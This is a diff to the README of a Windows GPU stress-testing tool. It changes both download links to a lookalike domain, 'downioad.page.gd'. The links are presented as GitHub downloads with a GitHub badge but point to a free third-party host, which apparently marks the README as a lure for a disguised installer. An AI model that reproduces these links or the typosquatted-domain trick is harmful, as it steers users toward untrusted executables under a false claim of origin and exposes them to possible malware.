@@ -2,7 +2,7 @@
 
 GPU Stress Test is a comprehensive tool designed to evaluate the stability, performance, and thermal capabilities of your graphics card on Windows 10 and 11 systems. Released in 2026, it provides an intuitive interface for both casual users and enthusiasts to conduct thorough stress tests. Whether you're validating a new GPU or ensuring system reliability, this tool offers essential features for accurate diagnostics.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -68,6 +68,6 @@ These answers cover the most frequent concerns, but if you have additional quest
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Stay updated with the most recent release to access new features and optimizations for your GPU stress testing needs.
